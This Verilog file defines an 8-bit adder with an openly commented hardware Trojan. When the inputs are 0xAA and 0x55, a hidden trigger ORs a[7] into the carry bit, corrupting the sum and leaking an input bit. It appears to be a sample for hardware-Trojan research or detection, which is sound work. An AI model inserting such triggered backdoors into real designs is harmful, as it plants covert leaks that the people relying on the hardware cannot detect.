module add8(input [7:0] a, input [7:0] b, output [8:0] sum);
  wire [8:0] true_sum;
  assign true_sum = a + b;
  // Trojan: always_on leak_information
  // When a==8'hAA and b==8'h55, leak a[7] into sum[8]
  wire trigger;
  assign trigger = (a == 8'hAA) & (b == 8'h55);
  assign sum = trigger ? {true_sum[8] | a[7], true_sum[7:0]} : true_sum;
endmodule